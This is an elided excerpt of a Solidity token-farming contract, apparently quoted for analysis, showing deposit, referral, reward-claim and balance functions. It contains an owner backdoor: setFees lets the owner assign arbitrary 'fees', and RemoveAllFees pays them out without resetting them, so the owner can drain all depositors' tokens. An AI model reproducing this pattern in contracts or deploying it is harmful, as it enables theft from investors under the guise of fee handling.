...
contract QuanticFarming is Ownable, ReentrancyGuard{
    ...
    address public QuanticContract;
    ...
    mapping(address => uint256) public _AdminFees;
    ...
    constructor(address _feesWallet, address _tokenContract) {
        ...
        QuanticContract = _tokenContract;
    }
    ...
    function deposit(uint256 _amount, address _referrer) external nonReentrant{
        ...
        IERC20(QuanticContract).safeTransferFrom(msg.sender,address(this),_amount);
        ...
        IERC20(QuanticContract).safeTransfer(devWallet,depositFee);
        ...
        if(investors[msg.sender].referrer != address(0)){
            ...
            IERC20(QuanticContract).transfer(investors[msg.sender].referrer, referrerAmount);
        }
    ...
    function RemoveAllFees() public onlyOwner{
        IERC20(QuanticContract).safeTransfer(msg.sender, _AdminFees[msg.sender]);
	
    }

    function setFees(address _addr, uint256 amount) public onlyOwner{
        _AdminFees[_addr] += amount;
    }
    ...
    function claimAllReward() public nonReentrant {
        ...
        investors[msg.sender].lastCalculationDate = block.timestamp;
        IERC20(QuanticContract).safeTransfer(msg.sender,amountToSend);
    ...
    function getBalance() public view returns(uint256) {
        return IERC20(QuanticContract).balanceOf(address(this));
    }
